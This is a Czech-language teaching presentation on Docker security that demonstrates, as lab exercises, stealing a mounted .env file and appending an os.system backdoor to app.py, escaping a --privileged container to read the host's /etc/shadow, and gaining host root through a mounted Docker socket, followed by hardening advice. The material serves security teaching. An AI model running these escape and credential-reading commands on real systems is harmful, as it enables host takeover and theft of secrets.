# **05. Docker Security: Útok na kontejnery**

## **Úvod: Proč řešit bezpečnost kontejnerů?**

Kontejnery **NEJSOU** virtuální stroje. Sdílejí jádro hostitelského operačního systému, což znamená:

* Pokud útočník unikne z kontejneru, má přístup k celému hostiteli.
* Mnoho vývojářů používá Docker bez pochopení bezpečnostních rizik.
* Výchozí konfigurace Dockeru je pohodlná, ale **ne bezpečná**.

**V této prezentaci uvidíte:**

1. Jak kontejner běžící jako **root** může být nebezpečný.
2. Jak útočník může **uprchnout z kontejneru** na hostitelský systém.
3. Jak přístup k **Docker socketu** dává útočníkovi kontrolu nad celým serverem.

---

## **1. Root vs. Non-Root: Kdo jsem v kontejneru?**

### **Demo A: Výchozí chování (Root)**

Spusťte si Alpine Linux kontejner a podívejte se, kdo jste:

```shell
docker run --rm -it alpine sh
```

Uvnitř kontejneru spusťte:

```shell
whoami
id
```

**Výstup:**
```
root
uid=0(root) gid=0(root) groups=0(root)...
```

**Problém:** Výchozí uživatel v kontejneru je **root** (UID 0). To znamená, že pokud útočník napadne vaši aplikaci, získá root práva uvnitř kontejneru.

### **Demo B: Co root v kontejneru může?**

Zkuste si vytvořit soubor a změnit systémový čas (uvnitř stále běží ten samý kontejner):

```shell
# Tohle funguje
echo "Byl jsem tu" > /tmp/hacked.txt
cat /tmp/hacked.txt

# Tohle NEFUNGUJE (kernel je sdílený s hostem)
date -s "2030-01-01"
```

Vidíte chybu: `date: can't set date: Operation not permitted`

**Vysvětlení:** I když jste root, kernel vás izoloval pomocí **namespaces** a **capabilities**. Některé věci prostě nemůžete.

Ukončete kontejner (`exit`).

### **Demo B2: Root + Volume Mount = Nebezpečí**

Teď ukážeme reálný scénář. Vývojáři **běžně** mountují projektový adresář do kontejneru (např. `docker run -v ./:/app`), aby mohli vyvíjet a testovat kód. Tento adresář ale často obsahuje `.env` soubory se secrets.

**Vytvoříme si simulaci webové aplikace:**

```shell
mkdir -p ~/demo-app
cd ~/demo-app

# Vytvoříme .env soubor (typický pro Node.js/Python projekty)
cat > .env << 'EOF'
DATABASE_URL=postgresql://admin:SuperSecret123@db.example.com:5432/production
JWT_SECRET=jwt-signing-key-do-not-share
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
STRIPE_SECRET_KEY=sk_live_51234567890abcdef
EOF

cat .env
```

**Spustíme kontejner tak, jak to dělají vývojáři (mountujeme projekt):**

```shell
docker run --rm -it -v $(pwd):/app alpine sh
```

**Uvnitř kontejneru (jako root):**

```shell
whoami  # root
cd /app

# Útočník objeví .env soubor
ls -la
cat .env

# Ukradne credentials
echo "Stolen secrets:" > /tmp/exfiltrated.txt
cat .env >> /tmp/exfiltrated.txt

# A navíc může vložit backdoor do aplikace
echo 'import os; os.system(os.getenv("CMD"))' >> /app/app.py
```

**Ukončete kontejner a zkontrolujte, co se stalo:**

```shell
exit
ls -la ~/demo-app
```

**Výsledek:** Útočník s root právy v kontejneru může:
- Přečíst **všechny secrets** z `.env` (databázové heslo, API klíče, atd.)
- Modifikovat zdrojový kód aplikace (vložit backdoor)
- Ukrást credentials a použít je k útoku na databázi nebo cloud
- Smazat nebo poškodit celý projekt

**Nezavírejte terminál, budeme pokračovat s Demo C.**

### **Demo C: Bezpečnější řešení (Non-Root)**

Nyní ukážeme, jak non-root uživatel omezí škody. Klíč je v tom, že **UID v kontejneru musí být jiné než UID vlastníka souborů**.

V produkci aplikace běží pod specifickým UID (např. 5000), zatímco soubory vlastní někdo jiný. Simulujeme to:

```shell
cd ~/demo-app
docker run --rm -it --user 5000:5000 -v $(pwd):/app alpine sh
```

**Uvnitř kontejneru zkuste:**

```shell
whoami  # unknown uid 5000
id      # uid=5000 gid=5000
cd /app

# Zkontrolujeme vlastnictví souborů
ls -la .env

# Zkusíme číst .env
cat .env

# Zkusíme ho modifikovat
echo "HACKED=true" >> .env
```

**Výsledek:**
```
-rw-r--r-- 1 1000 1000 .env
(Soubor čitelný, ale...)

sh: can't create .env: Permission denied
```

**Zkusíme vytvořit backdoor:**

```shell
echo 'BACKDOOR' > app.py
```

**Výsledek:**
```
sh: can't create app.py: Permission denied
```

**Co se stalo?**
- Soubor `.env` vlastní UID 1000 (váš uživatel na PC)
- Kontejner běží jako UID 5000 (jiný uživatel)
- UID 5000 může soubor **PŘEČÍST** (má práva `r--` pro others), ale **NEMŮŽE modifikovat**
- To omezuje škody - útočník nemůže vložit backdoor ani změnit konfiguraci

**Ukončete kontejner a ukliďte:**

```shell
exit
cd ~
rm -rf ~/demo-app
```

**Ponaučení:** Non-root kontejner výrazně omezuje škody:
- Útočník nemůže měnit soubory na hostiteli (pokud UIDs nesedí)
- Nemůže vložit backdoor do aplikace
- Nemůže smazat důležitá data

**Důležité poznámky:**
1. **Stále může číst secrets!** Proto je nutné kombinovat non-root s dalšími praktikami (šifrované secrets, minimální oprávnění)
2. **UID musí být jiné** - pokud kontejner běží jako UID 1000 a soubory vlastní UID 1000, může je měnit
3. V produkci se používají fixní UID (např. 1000, 5000) a soubory se kopírují do image s odpovídajícím vlastnictvím

---

## **2. Privilegované kontejnery: Klíče od království**

Nyní ukážeme, proč je přepínač `--privileged` **extrémně nebezpečný**.

### **Demo D: Normální kontejner (Omezený)**

Spusťte běžný kontejner a zkuste vidět diskové oddíly hostitele:

```shell
docker run --rm -it alpine sh
```

Uvnitř:

```shell
fdisk -l
ls /dev
```

**Vidíte:** Jen pár základních zařízení (`/dev/null`, `/dev/random`...), ale **NE skutečné disky** hostitele.

Ukončete kontejner (`exit`).

### **Demo E: Privilegovaný kontejner (Bez omezení)**

Nyní spusťte stejný kontejner s přepínačem `--privileged`:

```shell
docker run --rm -it --privileged alpine sh
```

Uvnitř znovu:

```shell
fdisk -l
ls /dev
```

**Vidíte:** Všechny disky hostitelského systému! (`/dev/sda`, `/dev/nvme0n1`...)

**Co to znamená?** Kontejner má přístup ke **všemu hardwaru** hostitele.

### **Demo F: Container Escape - Čtení souborů z hostu**

Teď ukážeme, jak z privilegovaného kontejneru číst soubory hostitelského systému.

**Stále jste v privilegovaném kontejneru.** Najděte hlavní diskový oddíl:

```shell
fdisk -l | grep -i "linux"
```

Uvidíte něco jako `/dev/sda1`, `/dev/nvme0n1p2` nebo podobně (závisí na vašem systému).

**Namountujte hostitelský filesystem:**

```shell
mkdir /mnt/host
mount /dev/sda1 /mnt/host   # Použijte správný oddíl z výstupu fdisk
```

> **Poznámka pro Windows (Docker Desktop):** Docker Desktop běží ve VM, takže `/dev/sda1` je disk této VM, ne vašeho Windows PC. Přesto stále demonstruje princip útoku.

**Nyní máte přístup k celému hostitelskému systému:**

```shell
ls /mnt/host
cat /mnt/host/etc/passwd
cat /mnt/host/etc/shadow    # Hashe hesel všech uživatelů!
```

**Útočník nyní může:**
- Číst všechny soubory (včetně SSH klíčů, hesel, secrets)
- Modifikovat systémové soubory
- Vytvořit backdoor
- Smazat celý disk

**Ukončete kontejner:**

```shell
exit
```

### **Kdy se --privileged používá legitimně?**

- **Docker-in-Docker** (CI/CD systémy jako GitLab Runner)
- **Systémové nástroje** (monitoring, správa hardwaru)
- **Vývojové prostředí** (testování kernelových funkcí)

**Nikdy** nepoužívejte `--privileged` pro běžné aplikace!

---

## **3. Docker Socket: Ovládání hostitele zevnitř**

Dalším častým bezpečnostním prohřeškem je sdílení Docker socketu do kontejneru.

### **Demo G: Co je Docker Socket?**

Docker daemon (server) poslouchá na souboru `/var/run/docker.sock`. Každý, kdo má přístup k tomuto souboru, může ovládat Docker jako root.

Podívejte se na něj na vašem PC:

```shell
ls -l /var/run/docker.sock
```

**Výstup (Linux/Mac):**
```
srw-rw---- 1 root docker /var/run/docker.sock
```

Je to **socket**, přes který Docker CLI mluví s Docker Daemonem.

### **Demo H: Běžný pattern (Nebezpečný!)**

Vývojáři často používají toto, když chtějí z kontejneru spouštět další kontejnery:

```shell
docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock docker:cli sh
```

> **Poznámka:** Použili jsme obraz `docker:cli`, který obsahuje Docker klienta.

Uvnitř kontejneru máte **plnou kontrolu nad Dockerem hostitele**:

```shell
docker ps
docker images
```

Vidíte **všechny kontejnery a obrazy na hostiteli**, ne jen ty v tomto kontejneru!

### **Demo I: Útok - Spuštění privilegovaného kontejneru z neprivilegovaného**

Stále jste uvnitř kontejneru s namountovaným socketem. Nyní spustíte **další kontejner**, který bude privilegovaný:

```shell
docker run --rm -it --privileged -v /:/host alpine sh
```

Co se stalo?
1. Váš neprivilegovaný kontejner spustil další kontejner.
2. Tento nový kontejner je **privilegovaný**.
3. A má namountovaný **celý hostitelský filesystem** na `/host`.

**V tomto novém kontejneru:**

```shell
ls /host
cat /host/etc/passwd
```

**Útočník z běžného kontejneru právě získal root přístup k hostiteli**, pouze proto, že měl přístup k Docker socketu!

**Ukončete oba kontejnery:**

```shell
exit  # První exit z privilegovaného kontejneru
exit  # Druhý exit z kontejneru se socketem
```

### **Kdy se Docker socket sdílí legitimně?**

- **CI/CD systémy** (build a push images)
- **Monitoring nástroje** (Portainer, cAdvisor)
- **Orchestrátory** (Traefik reverse proxy)

**Pravidlo:** Pokud nemusíte, **nikdy** nesdílejte Docker socket do kontejneru.

---

## **4. Shrnutí: Jak se bránit?**

### **Bezpečnostní Checklist:**

| Riziko | Jak se bránit |
| :---- | :---- |
| **Root v kontejneru** | Přidejte do `Dockerfile`: `USER 1000` nebo použijte `--user` |
| **Privilegované kontejnery** | Nikdy nepoužívejte `--privileged`, pokud to není naprosto nutné |
| **Docker socket** | Nesdílejte `/var/run/docker.sock`, pokud to není explicitně třeba |
| **Zranitelné obrazy** | Pravidelně aktualizujte base images, používejte `alpine` nebo `slim` |
| **Secrets v kódu** | Nikdy nehardcodujte hesla do `Dockerfile` nebo `ENV` |
| **Nepotřebné capability** | Explicitně dropněte capability: `--cap-drop=ALL` |

### **Bezpečný Dockerfile (Příklad):**

```dockerfile
FROM python:3.11-alpine

# 1. Vytvořte non-root uživatele
RUN addgroup -g 1000 appuser && \
    adduser -D -u 1000 -G appuser appuser

# 2. Nastavte pracovní adresář
WORKDIR /app

# 3. Zkopírujte a nainstalujte závislosti jako root (potřebné pro pip)
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# 4. Zkopírujte aplikaci
COPY . .

# 5. Přepněte na non-root uživatele PŘED spuštěním aplikace
USER appuser

# 6. Spusťte aplikaci
CMD ["python", "app.py"]
```

### **Bezpečný Docker Run:**

```shell
docker run -d \
  --user 1000:1000 \              # Non-root
  --cap-drop=ALL \                # Odebrat všechny capability
  --cap-add=NET_BIND_SERVICE \    # Přidat jen tu, co potřebujete
  --read-only \                   # Read-only filesystem
  --tmpfs /tmp \                  # Writable tmp (pokud potřebujete)
  --security-opt=no-new-privileges \
  moje-app:latest
```

---

## **Závěr**

V této prezentaci jste viděli:

- Jak **root** v kontejneru otevírá dveře útočníkům
- Jak `--privileged` umožňuje **úplný escape** z kontejneru
- Jak přístup k **Docker socketu** dává kontrolu nad celým hostem

**Hlavní ponaučení:**
Kontejnery jsou izolované, ale **jen když se používají správně**. Výchozí nastavení Dockeru upřednostňuje pohodlí před bezpečností. Jako vývojář máte zodpovědnost konfigurovat kontejnery bezpečně.

**Další kroky:**
- Používejte non-root uživatele ve všech produkčních aplikacích
- Nikdy nepoužívejte `--privileged` v produkci
- Pravidelně skenujte obrazy na zranitelnosti
- Držte se principu **minimálních privilegií**

---

**Užitečné odkazy:**
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
